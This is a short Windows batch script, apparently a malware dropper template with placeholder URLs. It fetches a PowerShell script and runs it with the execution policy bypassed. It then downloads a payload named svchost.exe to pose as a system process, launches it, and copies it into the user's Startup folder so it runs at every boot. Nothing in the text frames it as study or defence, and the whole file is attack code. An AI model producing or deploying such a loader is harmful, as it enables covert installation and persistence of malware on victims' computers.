@echo off

:: Run the PowerShell commands
curl -o C:\ProgramData\script.ps1 powershell script download here

:: Run the downloaded PowerShell script
powershell -ExecutionPolicy Bypass -File "C:\ProgramData\script.ps1"

:: Download the payload using curl
curl -o C:\ProgramData\svchost.exe payload here

:: Start the payload
start "" "C:\ProgramData\svchost.exe"

::set payload to start on boot
set StartupFolder=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
xcopy "C:\ProgramData\Svchost.exe" "%StartupFolder%" /Y
